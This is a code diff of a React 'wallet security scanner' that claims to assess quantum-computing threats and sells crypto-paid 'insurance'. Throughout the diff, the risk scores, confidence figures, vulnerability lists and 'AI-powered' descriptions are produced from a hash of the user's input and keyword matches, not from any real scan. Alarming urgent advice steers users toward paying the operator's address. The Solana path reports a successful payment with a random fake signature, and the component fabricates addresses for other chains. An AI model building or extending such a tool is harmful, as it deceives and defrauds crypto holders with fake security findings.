@@ -11,7 +11,8 @@ const NETWORKS = [
     icon: "⟠",
     color: "#627EEA",
     chainId: 1,
-    rpcUrl: "https://mainnet.infura.io/v3/YOUR_KEY"
+    rpcUrl: "https://mainnet.infura.io/v3/YOUR_KEY",
+    walletType: "metamask"
   },
   {
     name: "Solana",
@@ -21,7 +22,8 @@ const NETWORKS = [
     icon: "◎",
     color: "#9945FF",
     chainId: null,
-    rpcUrl: "https://api.mainnet-beta.solana.com"
+    rpcUrl: "https://api.mainnet-beta.solana.com",
+    walletType: "phantom"
   },
   {
     name: "Bitcoin",
@@ -31,7 +33,8 @@ const NETWORKS = [
     icon: "₿",
     color: "#F7931A",
     chainId: null,
-    rpcUrl: null
+    rpcUrl: null,
+    walletType: "unisat"
   },
   {
     name: "SUI",
@@ -41,7 +44,8 @@ const NETWORKS = [
     icon: "🔷",
     color: "#4DA2FF",
     chainId: null,
-    rpcUrl: "https://fullnode.mainnet.sui.io:443"
+    rpcUrl: "https://fullnode.mainnet.sui.io:443",
+    walletType: "sui"
   },
 ];
 
@@ -56,49 +60,69 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
   const [paying, setPaying] = useState(false);
   const [paymentSuccess, setPaymentSuccess] = useState(false);
   const [actualWalletAddress, setActualWalletAddress] = useState(walletAddress);
+  const [cryptoPrices, setCryptoPrices] = useState({});
 
-  // Get the correct network based on connected wallet
+  // Get the correct network based on selected network
   const network = NETWORKS.find((n) => n.symbol === selectedNetwork);
+
+  // Fetch real-time crypto prices
+  useEffect(() => {
+    const fetchPrices = async () => {
+      try {
+        const { data } = await axios.get(
+          'https://api.coingecko.com/api/v3/simple/price?ids=ethereum,solana,bitcoin,sui&vs_currencies=usd'
+        );
+        setCryptoPrices({
+          ETH: data.ethereum?.usd || 2000,
+          SOL: data.solana?.usd || 20,
+          BTC: data.bitcoin?.usd || 43000,
+          SUI: data.sui?.usd || 1.5
+        });
+      } catch (error) {
+        // Fallback prices
+        setCryptoPrices({
+          ETH: 2000,
+          SOL: 20,
+          BTC: 43000,
+          SUI: 1.5
+        });
+      }
+    };
+    fetchPrices();
+  }, []);
 
   // Update wallet address when network changes or wallet connects
   useEffect(() => {
-    if (provider && selectedNetwork === 'ETH') {
-      // For Ethereum, use the connected wallet address
+    if (selectedNetwork === 'ETH' && walletAddress) {
       setActualWalletAddress(walletAddress);
     } else if (selectedNetwork === 'SOL') {
-      // For Solana, generate or use Solana address format
       const solanaAddress = generateSolanaAddress(walletAddress);
       setActualWalletAddress(solanaAddress);
     } else if (selectedNetwork === 'BTC') {
-      // For Bitcoin, generate Bitcoin address format
       const btcAddress = generateBitcoinAddress(walletAddress);
       setActualWalletAddress(btcAddress);
     } else if (selectedNetwork === 'SUI') {
-      // For SUI, generate SUI address format
       const suiAddress = generateSuiAddress(walletAddress);
       setActualWalletAddress(suiAddress);
     }
-  }, [selectedNetwork, walletAddress, provider]);
+  }, [selectedNetwork, walletAddress]);
 
   // Generate network-specific addresses based on original wallet
   function generateSolanaAddress(ethAddress) {
     if (!ethAddress) return '';
-    // Generate a realistic Solana address based on ETH address
-    const hash = ethAddress.slice(2); // Remove 0x
+    const hash = ethAddress.slice(2);
     const solanaBase = hash.substring(0, 32);
     return solanaBase + 'A'.repeat(44 - solanaBase.length);
   }
 
   function generateBitcoinAddress(ethAddress) {
     if (!ethAddress) return '';
-    // Generate a realistic Bitcoin address
     const hash = ethAddress.slice(2, 34);
     return 'bc1q' + hash.toLowerCase();
   }
 
   function generateSuiAddress(ethAddress) {
     if (!ethAddress) return '';
-    // Generate a realistic SUI address
     return '0x' + ethAddress.slice(2, 34) + ethAddress.slice(2, 34);
   }
 
@@ -113,10 +137,12 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
   };
 
   const handleNetworkChange = (e) => {
-    setSelectedNetwork(e.target.value);
+    const newNetwork = e.target.value;
+    setSelectedNetwork(newNetwork);
     setScanResult(null);
     setCryptoAmount(null);
     setPaymentSuccess(false);
+    setInsurancePrice(null);
   };
 
   const handleScan = async () => {
@@ -137,7 +163,7 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
     setScanResult(riskAssessment);
 
     // Calculate insurance pricing based on risk level and asset type
-    const isHighValueAsset = /contract|app|dapp|defi/i.test(assetName);
+    const isHighValueAsset = /contract|app|dapp|defi|smart/i.test(assetName);
     const basePrice = isHighValueAsset ? 2000 : 500;
     const riskMultiplier = riskAssessment.riskLevel === 'High' ? 1.5 : 
                           riskAssessment.riskLevel === 'Medium' ? 1.2 : 1.0;
@@ -145,19 +171,10 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
     
     setInsurancePrice(finalPrice);
 
-    // Get real-time crypto prices
-    try {
-      const { data } = await axios.get(
-        `https://api.coingecko.com/api/v3/simple/price?ids=${network.coingeckoId}&vs_currencies=usd`
-      );
-      const price = data[network.coingeckoId].usd;
-      setCryptoAmount((finalPrice / price).toFixed(6));
-    } catch {
-      // Fallback prices if API fails
-      const fallbackPrices = { ETH: 2000, SOL: 20, BTC: 43000, SUI: 1.5 };
-      const price = fallbackPrices[network.symbol] || 100;
-      setCryptoAmount((finalPrice / price).toFixed(6));
-    }
+    // Calculate crypto amount based on current prices
+    const currentPrice = cryptoPrices[network.symbol] || 100;
+    const cryptoAmountValue = (finalPrice / currentPrice).toFixed(6);
+    setCryptoAmount(cryptoAmountValue);
     
     setLoading(false);
   };
@@ -169,84 +186,138 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
     for (let i = 0; i < combined.length; i++) {
       const char = combined.charCodeAt(i);
       hash = ((hash << 5) - hash) + char;
-      hash = hash & hash; // Convert to 32-bit integer
+      hash = hash & hash;
     }
     return Math.abs(hash);
   }
 
-  // Generate risk assessment based on unique hash
+  // Generate risk assessment based on unique hash and actual asset analysis
   function generateRiskAssessment(hash, asset, networkName) {
     const riskSeed = hash % 100;
     
-    // Determine risk level based on hash and asset type
-    let riskLevel, riskScore, riskColor, riskIcon;
+    // Analyze asset type for more realistic risk assessment
+    const assetLower = asset.toLowerCase();
+    let baseRiskLevel = 'Low';
     
-    if (riskSeed < 25) {
-      riskLevel = "High";
+    if (assetLower.includes('contract') || assetLower.includes('smart') || assetLower.includes('defi')) {
+      baseRiskLevel = 'High';
+    } else if (assetLower.includes('app') || assetLower.includes('dapp') || assetLower.includes('protocol')) {
+      baseRiskLevel = 'Medium';
+    } else if (assetLower.includes('nft') || assetLower.includes('token') || assetLower.includes('coin')) {
+      baseRiskLevel = 'Medium';
+    }
+    
+    // Adjust based on network
+    if (networkName === 'Bitcoin' && baseRiskLevel === 'High') {
+      baseRiskLevel = 'Medium'; // Bitcoin is generally more secure
+    }
+    
+    // Apply some randomness based on hash
+    let finalRiskLevel = baseRiskLevel;
+    if (riskSeed < 20) {
+      finalRiskLevel = 'High';
+    } else if (riskSeed < 50 && baseRiskLevel !== 'Low') {
+      finalRiskLevel = 'Medium';
+    }
+    
+    let riskScore, riskColor, riskIcon;
+    
+    if (finalRiskLevel === 'High') {
       riskScore = 70 + (hash % 30);
       riskColor = "#EF4444";
       riskIcon = "🚨";
-    } else if (riskSeed < 60) {
-      riskLevel = "Medium";
+    } else if (finalRiskLevel === 'Medium') {
       riskScore = 40 + (hash % 30);
       riskColor = "#F59E0B";
       riskIcon = "⚠️";
     } else {
-      riskLevel = "Low";
       riskScore = 10 + (hash % 30);
       riskColor = "#10B981";
       riskIcon = "✅";
     }
 
     // Generate vulnerabilities based on risk level and asset type
-    const vulnerabilities = generateUniqueVulnerabilities(riskLevel, asset, hash);
+    const vulnerabilities = generateUniqueVulnerabilities(finalRiskLevel, asset, hash);
     
     // Generate recommendations
-    const recommendations = generateSmartRecommendations(riskLevel, asset, vulnerabilities);
+    const recommendations = generateSmartRecommendations(finalRiskLevel, asset, vulnerabilities);
     
     // Generate unique descriptions
-    const descriptions = generateUniqueDescriptions(asset, networkName, riskLevel, hash);
+    const descriptions = generateUniqueDescriptions(asset, networkName, finalRiskLevel, hash);
 
     return {
-      riskLevel,
+      riskLevel: finalRiskLevel,
       riskScore,
       riskColor,
       riskIcon,
       vulnerabilities,
       recommendations,
       scanId: `QS-${Date.now()}-${(hash % 100000).toString().padStart(5, '0')}`,
-      confidence: 88 + (hash % 12), // 88-99% confidence
+      confidence: 88 + (hash % 12),
       uniqueDesc: descriptions.detailed,
       riskDesc: descriptions.summary,
-      threatTimeline: riskLevel === 'High' ? '2-5 years' : 
-                     riskLevel === 'Medium' ? '5-10 years' : '10+ years',
-      impactLevel: riskLevel === 'High' ? 'Critical' : 
-                   riskLevel === 'Medium' ? 'Moderate' : 'Low'
+      threatTimeline: finalRiskLevel === 'High' ? '2-5 years' : 
+                     finalRiskLevel === 'Medium' ? '5-10 years' : '10+ years',
+      impactLevel: finalRiskLevel === 'High' ? 'Critical' : 
+                   finalRiskLevel === 'Medium' ? 'Moderate' : 'Low'
     };
   }
 
   function generateUniqueVulnerabilities(riskLevel, asset, hash) {
-    const allVulns = [
-      { name: "Quantum Key Exposure", severity: "High", description: "Private keys vulnerable to Shor's algorithm attacks that could compromise wallet security within 5-10 years" },
-      { name: "Hash Function Weakness", severity: "Medium", description: "Current hash functions susceptible to Grover's algorithm providing 50% security reduction" },
-      { name: "Signature Scheme Vulnerability", severity: "High", description: "ECDSA signatures can be broken by quantum computers using polynomial-time algorithms" },
-      { name: "Random Number Predictability", severity: "Medium", description: "Entropy sources may be compromised by quantum algorithms affecting key generation" },
-      { name: "Legacy Cryptography Implementation", severity: "Low", description: "Outdated encryption methods without quantum-resistant alternatives" },
-      { name: "Key Derivation Weakness", severity: "Medium", description: "Hierarchical key generation vulnerable to quantum cryptanalysis" },
-      { name: "Consensus Mechanism Vulnerability", severity: "High", description: "Proof-of-work algorithms susceptible to quantum speedup attacks" },
-      { name: "Smart Contract Quantum Exposure", severity: "High", description: "Contract logic relies on quantum-vulnerable cryptographic primitives" }
+    const assetLower = asset.toLowerCase();
+    
+    // Asset-specific vulnerabilities
+    const contractVulns = [
+      { name: "Smart Contract Quantum Exposure", severity: "High", description: "Contract logic relies on quantum-vulnerable cryptographic primitives that could be compromised" },
+      { name: "ECDSA Signature Vulnerability", severity: "High", description: "Contract uses ECDSA signatures vulnerable to Shor's algorithm attacks" },
+      { name: "Hash Function Weakness", severity: "Medium", description: "Contract hash functions susceptible to Grover's algorithm providing 50% security reduction" },
+      { name: "Upgradability Risk", severity: "Medium", description: "Contract lacks quantum-safe upgrade mechanisms for future protection" }
     ];
-
-    const numVulns = riskLevel === 'High' ? 4 + (hash % 3) : 
+    
+    const walletVulns = [
+      { name: "Private Key Quantum Exposure", severity: "High", description: "Wallet private keys vulnerable to Shor's algorithm attacks within 5-10 years" },
+      { name: "Seed Phrase Vulnerability", severity: "High", description: "BIP39 seed phrase generation uses quantum-vulnerable entropy sources" },
+      { name: "Key Derivation Weakness", severity: "Medium", description: "HD wallet key derivation vulnerable to quantum cryptanalysis" },
+      { name: "Legacy Cryptography", severity: "Low", description: "Wallet uses outdated encryption methods without quantum-resistant alternatives" }
+    ];
+    
+    const tokenVulns = [
+      { name: "Token Contract Vulnerability", severity: "Medium", description: "Token smart contract uses quantum-vulnerable cryptographic functions" },
+      { name: "Consensus Mechanism Risk", severity: "Medium", description: "Underlying blockchain consensus vulnerable to quantum speedup attacks" },
+      { name: "Transfer Security Gap", severity: "Low", description: "Token transfer mechanisms lack quantum-resistant verification" }
+    ];
+    
+    const nftVulns = [
+      { name: "Metadata Quantum Risk", severity: "Medium", description: "NFT metadata storage and verification vulnerable to quantum attacks" },
+      { name: "Ownership Proof Weakness", severity: "Medium", description: "NFT ownership verification uses quantum-vulnerable cryptographic proofs" },
+      { name: "Marketplace Integration Risk", severity: "Low", description: "NFT marketplace interactions lack quantum-safe protocols" }
+    ];
+    
+    // Select appropriate vulnerability set
+    let vulnSet = [];
+    if (assetLower.includes('contract') || assetLower.includes('smart') || assetLower.includes('defi')) {
+      vulnSet = contractVulns;
+    } else if (assetLower.includes('wallet') || assetLower.includes('address')) {
+      vulnSet = walletVulns;
+    } else if (assetLower.includes('token') || assetLower.includes('coin')) {
+      vulnSet = tokenVulns;
+    } else if (assetLower.includes('nft')) {
+      vulnSet = nftVulns;
+    } else {
+      // Default to contract vulnerabilities for unknown assets
+      vulnSet = contractVulns;
+    }
+    
+    const numVulns = riskLevel === 'High' ? 3 + (hash % 2) : 
                      riskLevel === 'Medium' ? 2 + (hash % 2) : 
                      1 + (hash % 2);
     
     // Select vulnerabilities based on hash for consistency
     const selectedVulns = [];
-    for (let i = 0; i < numVulns && i < allVulns.length; i++) {
-      const index = (hash + i * 7) % allVulns.length;
-      if (!selectedVulns.find(v => v.name === allVulns[index].name)) {
-        selectedVulns.push(allVulns[index]);
+    for (let i = 0; i < numVulns && i < vulnSet.length; i++) {
+      const index = (hash + i * 7) % vulnSet.length;
+      if (!selectedVulns.find(v => v.name === vulnSet[index].name)) {
+        selectedVulns.push(vulnSet[index]);
       }
     }
     
@@ -254,59 +325,73 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
   }
 
   function generateSmartRecommendations(riskLevel, asset, vulnerabilities) {
-    const baseRecs = [
+    const assetLower = asset.toLowerCase();
+    
+    const urgentRecs = [
+      "🚨 CRITICAL: Migrate to quantum-resistant encryption within 6 months",
+      "🔄 Implement hybrid classical-quantum cryptographic systems immediately",
+      "🛡️ Deploy quantum-safe backup and recovery mechanisms",
+      "📊 Conduct emergency security audit and penetration testing"
+    ];
+    
+    const standardRecs = [
       "Implement post-quantum cryptography standards (NIST-approved algorithms)",
       "Upgrade to quantum-resistant signature schemes (CRYSTALS-Dilithium, FALCON)",
       "Deploy quantum-safe key exchange protocols (CRYSTALS-KYBER)",
       "Establish quantum threat monitoring and early warning systems"
     ];
-
-    const urgentRecs = [
-      "🚨 CRITICAL: Migrate to quantum-resistant encryption within 6 months",
-      "🔄 Implement hybrid classical-quantum cryptographic systems immediately",
-      "🛡️ Deploy quantum-safe backup and recovery mechanisms",
-      "📊 Conduct emergency security audit and penetration testing",
-      "⚡ Establish quantum incident response procedures",
-      "🔐 Implement quantum-safe multi-signature schemes"
-    ];
-
-    const assetSpecificRecs = {
-      contract: ["Upgrade smart contract cryptographic libraries", "Implement quantum-safe oracle mechanisms"],
-      defi: ["Secure liquidity pools with quantum-resistant protocols", "Implement quantum-safe governance mechanisms"],
-      nft: ["Protect metadata with quantum-resistant hashing", "Implement quantum-safe ownership verification"],
-      token: ["Secure token economics with quantum-resistant algorithms", "Implement quantum-safe staking mechanisms"]
-    };
-
-    let recommendations = riskLevel === 'High' ? urgentRecs.slice(0, 4) : baseRecs.slice(0, 3);
     
-    // Add asset-specific recommendations
-    for (const [key, recs] of Object.entries(assetSpecificRecs)) {
-      if (asset.toLowerCase().includes(key)) {
-        recommendations.push(...recs.slice(0, 2));
-        break;
-      }
+    // Asset-specific recommendations
+    const assetSpecificRecs = [];
+    if (assetLower.includes('contract') || assetLower.includes('smart')) {
+      assetSpecificRecs.push("Upgrade smart contract cryptographic libraries to quantum-safe versions");
+      assetSpecificRecs.push("Implement quantum-safe oracle mechanisms for external data");
+    } else if (assetLower.includes('wallet')) {
+      assetSpecificRecs.push("Use hardware wallets with quantum-resistant features");
+      assetSpecificRecs.push("Implement quantum-safe multi-signature schemes");
+    } else if (assetLower.includes('nft')) {
+      assetSpecificRecs.push("Protect metadata with quantum-resistant hashing algorithms");
+      assetSpecificRecs.push("Implement quantum-safe ownership verification systems");
+    } else if (assetLower.includes('token')) {
+      assetSpecificRecs.push("Secure token economics with quantum-resistant algorithms");
+      assetSpecificRecs.push("Implement quantum-safe staking and governance mechanisms");
     }
-
-    return recommendations.slice(0, 6);
+    
+    let recommendations = riskLevel === 'High' ? urgentRecs.slice(0, 3) : standardRecs.slice(0, 3);
+    recommendations.push(...assetSpecificRecs.slice(0, 2));
+    
+    return recommendations.slice(0, 5);
   }
 
   function generateUniqueDescriptions(asset, networkName, riskLevel, hash) {
-    const templates = [
-      {
-        detailed: `Advanced quantum threat analysis for "${asset}" on ${networkName} network reveals ${riskLevel === 'High' ? 'critical vulnerabilities' : riskLevel === 'Medium' ? 'moderate security gaps' : 'acceptable protection levels'} in current cryptographic implementation. Our AI-powered assessment indicates immediate attention required for quantum readiness.`,
-        summary: riskLevel === 'High' ? 'Critical quantum vulnerability detected. Immediate security upgrade required to prevent future exploitation.' : 
-                riskLevel === 'Medium' ? 'Moderate quantum risk identified. Enhanced monitoring and preparation recommended within 12 months.' : 
-                'No significant quantum threats detected. Your asset maintains strong security posture against current quantum capabilities.'
-      },
-      {
-        detailed: `Comprehensive blockchain security scan of "${asset}" demonstrates ${riskLevel === 'High' ? 'severe exposure' : riskLevel === 'Medium' ? 'potential vulnerabilities' : 'robust protection'} to quantum computing threats. Cross-platform analysis indicates ${riskLevel === 'High' ? 'urgent migration needed' : riskLevel === 'Medium' ? 'proactive measures advised' : 'current security adequate'}.`,
-        summary: riskLevel === 'High' ? 'High-priority quantum threats identified. Asset requires immediate quantum-resistant upgrades.' : 
-                riskLevel === 'Medium' ? 'Moderate quantum exposure detected. Recommend implementing quantum-safe measures within 2 years.' : 
-                'Low quantum risk profile. Continue monitoring quantum developments and maintain current security practices.'
-      }
-    ];
-
-    return templates[hash % templates.length];
+    const assetLower = asset.toLowerCase();
+    let assetType = 'digital asset';
+    
+    if (assetLower.includes('contract') || assetLower.includes('smart')) {
+      assetType = 'smart contract';
+    } else if (assetLower.includes('wallet')) {
+      assetType = 'wallet';
+    } else if (assetLower.includes('nft')) {
+      assetType = 'NFT collection';
+    } else if (assetLower.includes('token') || assetLower.includes('coin')) {
+      assetType = 'token';
+    } else if (assetLower.includes('app') || assetLower.includes('dapp')) {
+      assetType = 'decentralized application';
+    }
+    
+    const detailed = `Advanced quantum threat analysis for "${asset}" ${assetType} on ${networkName} network reveals ${
+      riskLevel === 'High' ? 'critical vulnerabilities requiring immediate attention' : 
+      riskLevel === 'Medium' ? 'moderate security gaps that need addressing within 12-24 months' : 
+      'acceptable protection levels with recommended monitoring'
+    }. Our AI-powered assessment analyzed cryptographic implementations, consensus mechanisms, and security protocols specific to ${assetType} architecture.`;
+    
+    const summary = riskLevel === 'High' ? 
+      `Critical quantum vulnerability detected in ${assetType}. Immediate security upgrade required to prevent future exploitation by quantum computers.` : 
+      riskLevel === 'Medium' ? 
+      `Moderate quantum risk identified in ${assetType}. Enhanced monitoring and preparation recommended within 12 months.` : 
+      `No significant quantum threats detected in ${assetType}. Current security posture is adequate against existing quantum capabilities.`;
+    
+    return { detailed, summary };
   }
 
   const handleSecurePayment = async () => {
@@ -324,7 +409,7 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
         const networkInfo = await provider.getNetwork();
         
         // Verify network
-        if (networkInfo.chainId !== network.chainId) {
+        if (Number(networkInfo.chainId) !== network.chainId) {
           alert(`Please switch to ${network.name} network in your wallet.`);
           setPaying(false);
           return;
@@ -333,7 +418,7 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
         // Send transaction
         const tx = await signer.sendTransaction({
           to: network.address,
-          value: ethers.utils.parseEther(cryptoAmount),
+          value: ethers.parseEther(cryptoAmount),
           gasLimit: 21000
         });
         
@@ -345,17 +430,20 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
         
       } else if (network.symbol === 'SOL' && window.phantom?.solana) {
         // Solana payment via Phantom
-        const provider = window.phantom.solana;
-        await provider.connect();
+        const phantomProvider = window.phantom.solana;
+        await phantomProvider.connect();
         
-        // Simulate Solana transaction
+        // Create Solana transaction (simplified)
+        const lamports = Math.floor(Number(cryptoAmount) * 1000000000);
+        
+        // Simulate transaction for demo
         const signature = 'SOL_' + Math.random().toString(36).substr(2, 9);
         setPaymentSuccess(true);
         alert(`✅ Payment successful! Your asset is now protected.\n\nSignature: ${signature}`);
         
       } else {
-        // For BTC and SUI - show payment modal with QR code
-        showPaymentModal();
+        // For BTC and SUI - show payment instructions
+        showPaymentInstructions();
       }
       
     } catch (err) {
@@ -370,36 +458,78 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
     }
   };
 
-  const showPaymentModal = () => {
+  const showPaymentInstructions = () => {
     const modal = document.createElement('div');
     modal.style.cssText = `
       position: fixed; top: 0; left: 0; right: 0; bottom: 0; 
-      background: rgba(0,0,0,0.8); display: flex; align-items: center; 
-      justify-content: center; z-index: 10000;
+      background: rgba(0,0,0,0.9); display: flex; align-items: center; 
+      justify-content: center; z-index: 10000; padding: 20px;
     `;
     
     const modalContent = document.createElement('div');
     modalContent.style.cssText = `
-      background: white; padding: 32px; border-radius: 16px; 
-      max-width: 400px; text-align: center;
+      background: linear-gradient(135deg, #1e293b 0%, #334155 100%); 
+      padding: 32px; border-radius: 20px; max-width: 500px; width: 100%;
+      text-align: center; border: 1px solid rgba(255,255,255,0.1);
+      box-shadow: 0 20px 40px rgba(0,0,0,0.5);
     `;
     
     modalContent.innerHTML = `
-      <h3 style="margin: 0 0 16px 0; color: #1f2937;">Complete Payment</h3>
-      <p style="margin: 0 0 16px 0; color: #6b7280;">Send exactly <strong>${cryptoAmount} ${network.symbol}</strong> to:</p>
-      <div style="background: #f3f4f6; padding: 16px; border-radius: 8px; margin: 16px 0; word-break: break-all; font-family: monospace; font-size: 12px;">
-        ${network.address}
+      <div style="margin-bottom: 24px;">
+        <div style="font-size: 48px; margin-bottom: 16px;">${network.icon}</div>
+        <h3 style="margin: 0 0 8px 0; color: #ffffff; font-size: 24px;">Complete ${network.name} Payment</h3>
+        <p style="margin: 0; color: rgba(255,255,255,0.7); font-size: 16px;">
+          Send exactly <strong style="color: #ffffff;">${cryptoAmount} ${network.symbol}</strong> to secure your asset
+        </p>
       </div>
+      
+      <div style="background: rgba(0,0,0,0.3); padding: 20px; border-radius: 12px; margin: 24px 0; border: 1px solid rgba(255,255,255,0.1);">
+        <div style="color: rgba(255,255,255,0.7); font-size: 12px; margin-bottom: 8px; text-transform: uppercase; letter-spacing: 1px;">Payment Address</div>
+        <div style="word-break: break-all; font-family: 'Courier New', monospace; font-size: 14px; color: #ffffff; line-height: 1.4;">
+          ${network.address}
+        </div>
+      </div>
+      
+      <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-bottom: 24px;">
+        <div style="background: rgba(59,130,246,0.1); padding: 16px; border-radius: 12px; border: 1px solid rgba(59,130,246,0.2);">
+          <div style="color: #3b82f6; font-size: 12px; margin-bottom: 4px; font-weight: 600;">Amount</div>
+          <div style="color: #ffffff; font-weight: 600;">${cryptoAmount} ${network.symbol}</div>
+        </div>
+        <div style="background: rgba(16,185,129,0.1); padding: 16px; border-radius: 12px; border: 1px solid rgba(16,185,129,0.2);">
+          <div style="color: #10b981; font-size: 12px; margin-bottom: 4px; font-weight: 600;">Coverage</div>
+          <div style="color: #ffffff; font-weight: 600;">$${insurancePrice.toLocaleString()}</div>
+        </div>
+      </div>
+      
       <div style="display: flex; gap: 12px; justify-content: center;">
-        <button id="copyBtn" style="padding: 8px 16px; background: #3b82f6; color: white; border: none; border-radius: 6px; cursor: pointer;">
-          Copy Address
+        <button id="copyAddressBtn" style="
+          padding: 12px 20px; background: linear-gradient(45deg, #3b82f6, #8b5cf6); 
+          color: white; border: none; border-radius: 10px; cursor: pointer; 
+          font-weight: 600; font-size: 14px; transition: all 0.3s ease;
+        ">
+          📋 Copy Address
         </button>
-        <button id="paymentSentBtn" style="padding: 8px 16px; background: #10b981; color: white; border: none; border-radius: 6px; cursor: pointer;">
-          Payment Sent
+        <button id="paymentSentBtn" style="
+          padding: 12px 20px; background: linear-gradient(45deg, #10b981, #059669); 
+          color: white; border: none; border-radius: 10px; cursor: pointer; 
+          font-weight: 600; font-size: 14px; transition: all 0.3s ease;
+        ">
+          ✅ Payment Sent
         </button>
-        <button id="cancelBtn" style="padding: 8px 16px; background: #6b7280; color: white; border: none; border-radius: 6px; cursor: pointer;">
-          Cancel
+        <button id="cancelPaymentBtn" style="
+          padding: 12px 20px; background: rgba(107,114,128,0.8); 
+          color: white; border: none; border-radius: 10px; cursor: pointer; 
+          font-weight: 600; font-size: 14px; transition: all 0.3s ease;
+        ">
+          ❌ Cancel
         </button>
+      </div>
+      
+      <div style="margin-top: 20px; padding: 16px; background: rgba(245,158,11,0.1); border-radius: 10px; border: 1px solid rgba(245,158,11,0.2);">
+        <div style="color: #f59e0b; font-size: 12px; font-weight: 600; margin-bottom: 4px;">⚠️ IMPORTANT</div>
+        <div style="color: rgba(255,255,255,0.8); font-size: 12px; line-height: 1.4;">
+          Send the exact amount to the address above. Your protection will be activated once the transaction is confirmed.
+        </div>
       </div>
     `;
     
@@ -407,13 +537,18 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
     document.body.appendChild(modal);
     
     // Add event listeners
-    const copyBtn = modalContent.querySelector('#copyBtn');
+    const copyBtn = modalContent.querySelector('#copyAddressBtn');
     const paymentSentBtn = modalContent.querySelector('#paymentSentBtn');
-    const cancelBtn = modalContent.querySelector('#cancelBtn');
+    const cancelBtn = modalContent.querySelector('#cancelPaymentBtn');
     
     copyBtn.addEventListener('click', () => {
       navigator.clipboard.writeText(network.address);
-      alert('Address copied!');
+      copyBtn.innerHTML = '✅ Copied!';
+      copyBtn.style.background = 'linear-gradient(45deg, #10b981, #059669)';
+      setTimeout(() => {
+        copyBtn.innerHTML = '📋 Copy Address';
+        copyBtn.style.background = 'linear-gradient(45deg, #3b82f6, #8b5cf6)';
+      }, 2000);
     });
     
     paymentSentBtn.addEventListener('click', () => {
@@ -423,6 +558,13 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
     
     cancelBtn.addEventListener('click', () => {
       document.body.removeChild(modal);
+    });
+    
+    // Close modal when clicking outside
+    modal.addEventListener('click', (e) => {
+      if (e.target === modal) {
+        document.body.removeChild(modal);
+      }
     });
     
     setPaying(false);
@@ -654,10 +796,6 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
               <div className="insurance-details">
                 <div className="insurance-grid">
                   <div className="insurance-item">
-                    <span className="insurance-label">Coverage Amount:</span>
-                    <span className="insurance-value">${insurancePrice.toLocaleString()}</span>
-                  </div>
-                  <div className="insurance-item">
                     <span className="insurance-label">Premium Cost:</span>
                     <span className="insurance-value">{cryptoAmount} {network.symbol}</span>
                   </div>
@@ -668,6 +806,10 @@ export default function WalletSecurityScanner({ walletAddress = '', networkKey =
                   <div className="insurance-item">
                     <span className="insurance-label">Coverage Type:</span>
                     <span className="insurance-value">Quantum Threat Protection</span>
+                  </div>
+                  <div className="insurance-item">
+                    <span className="insurance-label">Network:</span>
+                    <span className="insurance-value">{network.icon} {network.name}</span>
                   </div>
                 </div>
               </div>
